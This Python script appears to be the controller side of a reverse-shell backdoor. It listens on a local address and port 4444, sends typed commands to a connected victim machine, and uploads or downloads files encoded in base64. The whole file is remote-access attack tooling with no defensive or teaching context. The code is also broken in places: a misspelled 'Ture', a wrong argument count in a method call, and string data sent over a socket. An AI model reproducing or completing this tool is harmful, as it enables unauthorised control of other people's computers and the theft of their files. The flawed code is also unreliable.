#!/usr/bin/env python

from socket import *
import json
#import subprocess
import base64

Ip_Adress = "192.168.1.230"
Port = 4444

class Listener:
     def __init__(self, ip, port):
          listener = socket(AF_INET, SOCK_STREAM)
          listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
          listener.bind((Ip_Adress, Port))
          listener.listen(0)
          print("[+] Waiting for incoming connections")
          self.connection, address = listener.accept()
          print("[+] Got a Connection from " + str(address))

     def reliable_send(self, data):
          json_data = json.dumps(data)
          self.connection.send(json_data)

     def reliable_receive(self):
          json_data = ""
          while Ture:
               try:
                    json_data = json_data + self.connection.recv(1024)
                    return json.loads(json_data)
               except ValueError:
                    continue

     def execute_remotely(self, command):
          self.reliable_send(command)
          
          if command[0] == "exit":
               self.connection.close()
               exit()
                       
          return self.reliable_receive(1024)

     def write_file(self, path, content):
          with open(path, "wb") as file: # change to wb to w if need!
               file.write(base64.b64decode(content))
               return "[+] Download successful"

     def read_file(self, path):
          with open(path, "rb") as file: # change to rb to r if need!
               return base64.b64encode(file.read())

     def run(self):
          while True:
               command = input(">> ")
               command = command.split(" ")

               try:
                    if command[0] == "upload":
                         file_content = self.read_file(command[1])
                         command.append(file_content)
               
                    result = self.execute_remotely(command)
                    if command[0] == "download" and "[-] Error " not in result:
                         result = self.write_file(command[1], result)
               except Exception:
                    result = "[-] Error during command executing"
                    
               print(result)


my_listener = Listener(Ip_Adress,Port)
my_listener.run()


